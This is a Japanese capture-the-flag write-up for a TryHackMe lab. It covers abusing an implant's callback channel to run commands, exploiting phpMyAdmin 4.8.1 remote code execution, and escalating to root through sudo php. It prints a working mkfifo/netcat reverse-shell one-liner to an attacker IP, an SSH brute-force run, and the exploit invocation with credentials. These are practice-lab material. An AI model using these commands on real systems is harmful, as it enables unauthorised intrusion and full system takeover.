# Forgotten Implant CTF

https://tryhackme.com/room/forgottenimplant

## Enumeration

```shell
TARGET=10.64.159.229
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 6
```

```sh
sudo nmap -sV -p22 $TARGET

PORT   STATE  SERVICE VERSION
22/tcp open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
```

SSHしか開いていない。

あまりにも手掛かりがないので、ショートリストを使ってブルートフォースしてみたが、空振り。

```sh
root@ip-10-64-78-110:~# hydra -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt $TARGET ssh -t 30
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-27 05:20:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 3774 login tries (l:17/p:222), ~126 tries per task
[DATA] attacking ssh://10.64.159.229:22/
[STATUS] 286.00 tries/min, 286 tries in 00:01h, 3501 to do in 00:13h, 30 active
[STATUS] 276.67 tries/min, 830 tries in 00:03h, 2970 to do in 00:11h, 30 active
[STATUS] 249.00 tries/min, 1743 tries in 00:07h, 2092 to do in 00:09h, 30 active
[STATUS] 255.50 tries/min, 3066 tries in 00:12h, 769 to do in 00:04h, 30 active
1 of 1 target completed, 0 valid passwords found
```

SSHの脆弱性検査

```sh
root@ip-10-64-78-110:~# nmap -sV -p22 --script vuln $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-27 05:38 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for implant.thm (10.64.159.229)
Host is up (0.00026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|     	PACKETSTORM:173661	9.8	https://vulners.com/packetstorm/PACKETSTORM:173661	*EXPLOIT*
|     	F0979183-AE88-53B4-86CF-3AF0523F3807	9.8	https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807	*EXPLOIT*
|     	CVE-2023-38408	9.8	https://vulners.com/cve/CVE-2023-38408
|     	B8190CDB-3EB9-5631-9828-8064A1575B23	9.8	https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23	*EXPLOIT*
|     	8FC9C5AB-3968-5F3C-825E-E8DB5379A623	9.8	https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623	*EXPLOIT*
|     	8AD01159-548E-546E-AA87-2DE89F3927EC	9.8	https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC	*EXPLOIT*
|     	2227729D-6700-5C8F-8930-1EEAFD4B9FF0	9.8	https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0	*EXPLOIT*
|     	0221525F-07F5-5790-912D-F4B9E2D1B587	9.8	https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587	*EXPLOIT*
|     	BA3887BD-F579-53B1-A4A4-FF49E953E1C0	8.1	https://vulners.com/githubexploit/BA3887BD-F579-53B1-A4A4-FF49E953E1C0	*EXPLOIT*
```

CVE-2023-38408 は、自分がSSH接続できる状態で、他の人のSSHセッションを乗っ取る脆弱性なので少なくとも今の状態では使えない。

全く分からずウォークスルーをチラ見した。

nmap によるスキャンを実行したら、VMからこちらに対して接続してくるらしい。

- VPNではこのトリックが機能せず、AttackBox で実行する必要があった。
- 必ずではないが、81番ポートが定番

```sh
tcpdump -i tun0 port 81 -vv
```

下記の繰り返し。

```sh
root@ip-10-64-121-179:~# python3 -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
10.64.132.87 - - [27/Nov/2025 06:54:01] code 404, message File not found
10.64.132.87 - - [27/Nov/2025 06:54:01] "GET /heartbeat/eyJ0aW1lIjogIjIwMjUtMTEtMjdUMDY6NTQ6MDEuMzQwMzI2IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTY0LTEzMi04NyJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0= HTTP/1.1" 404 -
10.64.132.87 - - [27/Nov/2025 06:54:02] code 404, message File not found
10.64.132.87 - - [27/Nov/2025 06:54:02] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 -
10.64.132.87 - - [27/Nov/2025 06:54:02] code 404, message File not found
10.64.132.87 - - [27/Nov/2025 06:54:02] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ== HTTP/1.1" 404 -
10.64.132.87 - - [27/Nov/2025 06:55:01] code 404, message File not found
10.64.132.87 - - [27/Nov/2025 06:55:01] "GET /heartbeat/eyJ0aW1lIjogIjIwMjUtMTEtMjdUMDY6NTU6MDEuNTg5OTU2IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTY0LTEzMi04NyJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0= HTTP/1.1" 404 -
10.64.132.87 - - [27/Nov/2025 06:55:02] code 404, message File not found
10.64.132.87 - - [27/Nov/2025 06:55:02] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 -
10.64.132.87 - - [27/Nov/2025 06:55:02] code 404, message File not found
10.64.132.87 - - [27/Nov/2025 06:55:02] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ== HTTP/1.1" 404 -
10.64.132.87 - - [27/Nov/2025 06:56:01] code 404, message File not found
10.64.132.87 - - [27/Nov/2025 06:56:01] "GET /heartbeat/eyJ0aW1lIjogIjIwMjUtMTEtMjdUMDY6NTY6MDEuODQ2NTQyIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImlwLTEwLTY0LTEzMi04NyJ9LCAibGF0ZXN0X2pvYiI6IHsiam9iX2lkIjogMCwgImNtZCI6ICJ3aG9hbWkifSwgInN1Y2Nlc3MiOiBmYWxzZX0= HTTP/1.1" 404 -
10.64.132.87 - - [27/Nov/2025 06:56:02] code 404, message File not found
10.64.132.87 - - [27/Nov/2025 06:56:02] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 -
10.64.132.87 - - [27/Nov/2025 06:56:02] code 404, message File not found
10.64.132.87 - - [27/Nov/2025 06:56:02] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ== HTTP/1.1" 404 -
```

デコードしたら下記の内容。

```json
{"time": "2025-11-27T06:54:01.340326", "systeminfo": {"os": "Linux", "hostname": "ip-10-64-132-87"}, "latest_job": {"job_id": 0, "cmd": "whoami"}, "success": false}


"latest"

{"success": false, "result": "Encoding error"}
```

get-job でリクエストされているものを書き換えてみる。

```sh
root@ip-10-64-121-179:~# mkdir get-job
root@ip-10-64-121-179:~# cd get-job
root@ip-10-64-121-179:~/get-job# echo 'whoami' > ImxhdGVzdCI=
```

get-job/ImxhdGVzdCI= の中身をBase64にすると、次のエラーに変わった。

```json
{"success": false, "result": "JSON error"}
```

`{"job_id": 0, "cmd": "whoami"}` のBase64エンコードに変更したところ、次の結果を得た。

```json
{"job_id": 0, "cmd": "whoami", "success": true, "result": "ada\n"}
```

`{"job_id": 0, "cmd": "cat /home/ada/.ssh/id_rsa | base64"}` のBase64に変更。結果は空。

```json
{"job_id": 0, "cmd": "cat /home/ada/.ssh/id_rsa | base64", "success": true, "result": ""}
```

同様にして、/etc/passwd を出力。fi, ada ユーザーを確認。

```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
fi:x:1000:1000:fi:/home/fi:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
ada:x:1001:1001:,,,:/home/ada:/bin/bash
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
ssm-user:x:1002:1002::/home/ssm-user:/bin/sh
ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
```

`ls -al /home/ada`

```sh
total 44
drwxr-xr-x 5 ada  ada  4096 Mar 13  2023 .
drwxr-xr-x 6 root root 4096 Nov 27 06:49 ..
lrwxrwxrwx 1 ada  ada     9 Jul 10  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ada  ada   220 Jul 10  2022 .bash_logout
-rw-r--r-- 1 ada  ada  3771 Jul 10  2022 .bashrc
drwx------ 3 ada  ada  4096 Jul 12  2022 .cache
drwxrwxr-x 2 ada  ada  4096 Nov 27 06:54 .implant
drwxrwxr-x 4 ada  ada  4096 Jul 12  2022 .local
-rw-rw-r-- 1 ada  ada   292 Jul 12  2022 products.py
-rw-r--r-- 1 ada  ada   807 Jul 10  2022 .profile
lrwxrwxrwx 1 ada  ada     9 Jul 10  2022 .python_history -> /dev/null
-rw-rw-r-- 1 ada  ada    66 Jul 11  2022 .selected_editor
-rw-rw-r-- 1 ada  ada    38 Jul 12  2022 user.txt
```

`ls -al /home/fi`

```sh
total 2028
drwxr-xr-x 6 fi   fi      4096 Apr 29  2023 .
drwxr-xr-x 6 root root    4096 Nov 27 06:49 ..
lrwxrwxrwx 1 fi   fi         9 Jul 10  2022 .bash_history -> /dev/null
-rw-r--r-- 1 fi   fi       220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 fi   fi      3771 Feb 25  2020 .bashrc
drwx------ 3 fi   fi      4096 Jul 12  2022 .cache
drwxrwxr-x 4 fi   fi      4096 Apr 14  2023 .config
drwxrwxr-x 3 fi   fi      4096 Jul 10  2022 .local
-rw-r--r-- 1 fi   fi       807 Feb 25  2020 .profile
lrwxrwxrwx 1 fi   fi         9 Jul 10  2022 .python_history -> /dev/null
-rwxrwxr-x 1 fi   fi       270 Apr 14  2023 sanitize.sh
-rw-rw-r-- 1 fi   fi        66 Jul 12  2022 .selected_editor
-rw-r--r-- 1 root root 2020573 Nov 27 06:53 sniffer.log
-rwxrwxr-x 1 fi   fi      2106 Apr 29  2023 sniffer.py
drwx------ 2 fi   fi      4096 Jul 10  2022 .ssh
-rw-r--r-- 1 fi   fi         0 Jul 10  2022 .sudo_as_admin_successful
```

`cat /home/ada/products.py` このパスワードで、ada, fi のSSH接続を試したが空振り。

```python
import mysql.connector

db = mysql.connector.connect(
    host='localhost', 
    database='app', 
    user='app', 
    password='s4Ucbrme'
    )

cursor = db.cursor()
cursor.execute('SELECT * FROM products')

for product in cursor.fetchall():
    print(f'We have {product[2]}x {product[1]}')
```

単刀直入にリバースシェルを取った。

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [192.168.131.69] from (UNKNOWN) [10.64.132.87] 41316
sh: 0: can't access tty; job control turned off
$ id
uid=1001(ada) gid=1001(ada) groups=1001(ada)
```

## 権限昇格

fi に昇格したい。  
まず mysql に接続したが、役に立たなかった。

/home/fi のシェルやPythonは気になるが、pspyを実行しても fi がジョブを実行している形跡がないので、これらを使って fi に昇格できるかはかなり疑わしい状況。

```sh
ada@ip-10-64-132-87:/home/fi$ ls -al
total 2400
drwxr-xr-x 6 fi   fi      4096 Apr 29  2023 .
drwxr-xr-x 6 root root    4096 Nov 27 06:49 ..
lrwxrwxrwx 1 fi   fi         9 Jul 10  2022 .bash_history -> /dev/null
-rw-r--r-- 1 fi   fi       220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 fi   fi      3771 Feb 25  2020 .bashrc
drwx------ 3 fi   fi      4096 Jul 12  2022 .cache
drwxrwxr-x 4 fi   fi      4096 Apr 14  2023 .config
drwxrwxr-x 3 fi   fi      4096 Jul 10  2022 .local
-rw-r--r-- 1 fi   fi       807 Feb 25  2020 .profile
lrwxrwxrwx 1 fi   fi         9 Jul 10  2022 .python_history -> /dev/null
-rwxrwxr-x 1 fi   fi       270 Apr 14  2023 sanitize.sh
-rw-rw-r-- 1 fi   fi        66 Jul 12  2022 .selected_editor
-rw-r--r-- 1 root root 2402397 Nov 27 07:52 sniffer.log
-rwxrwxr-x 1 fi   fi      2106 Apr 29  2023 sniffer.py
drwx------ 2 fi   fi      4096 Jul 10  2022 .ssh
-rw-r--r-- 1 fi   fi         0 Jul 10  2022 .sudo_as_admin_successful
```

ssコマンドで、ローカル80ポートをリッスンしていることが分かった。

- 80ポートをトンネリングして、phpMyAdmin が表示された。
- product.py で入手した認証情報でログインできた。

当該バージョンの脆弱性。

```sh
$ searchsploit php admin 4.8.1           
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Interspire Email Marketer < 6.1.6 - Remote Admin Authentication Bypass           | php/webapps/44513.py
NPDS 4.8 < 5.0 - 'admin.php?language' Cross-Site Scripting                       | php/webapps/25742.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)                      | php/webapps/44924.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)                      | php/webapps/44928.txt
phpMyAdmin 4.8.1 - Remote Code Execution (RCE)                                   | php/webapps/50457.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

www-data としてコマンドの実行が可能。（www-data になる意味があるのかは疑問だが）

```sh
$ python ./50457.py localhost 8080 / app s4Ucbrme id
/home/kali/ctf/implant/./50457.py:29: SyntaxWarning: invalid escape sequence '\s'
  s = re.search('token"\s*value="(.*?)"', content)
/home/kali/ctf/implant/./50457.py:50: SyntaxWarning: invalid escape sequence '\d'
  s = re.search('PMA_VERSION:"(\d+\.\d+\.\d+)"', content)
/home/kali/ctf/implant/./50457.py:64: SyntaxWarning: invalid escape sequence '\w'
  s = re.search('logged_in:(\w+),', content)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

リバースシェルを実行。

```sh
$ python ./50457.py localhost 8080 / app s4Ucbrme 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.131.69 8889 >/tmp/f'
```

www-data のリバースシェル取得

```sh
$ nc -lnvp 8889               
listening on [any] 8889 ...
connect to [192.168.131.69] from (UNKNOWN) [10.64.132.87] 60864
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

root としてPHPを実行可能。

```sh
www-data@ip-10-64-132-87:/var/www/phpmyadmin$ sudo -l
Matching Defaults entries for www-data on ip-10-64-132-87:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-64-132-87:
    (root) NOPASSWD: /usr/bin/php
```

root 昇格成功。

```sh
www-data@ip-10-64-132-87:/var/www/phpmyadmin$ sudo /usr/bin/php -r "system('/bin/sh');"
id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- ポートが開いていない状態から攻撃するパターンを初めて見た。知らないとどうしようもないタイプ。`リバースコールバック` と新規タグ付け。
- 良い学びになったが、VPNでは機能せずAttackBoxが必要だった。この点だけは非常に良くない。
- phpMyAdmin で、mysql と同じ認証情報を使うという発想が難しかった。

## Tags

#tags:リバースコールバック #tags:phpMyAdmin
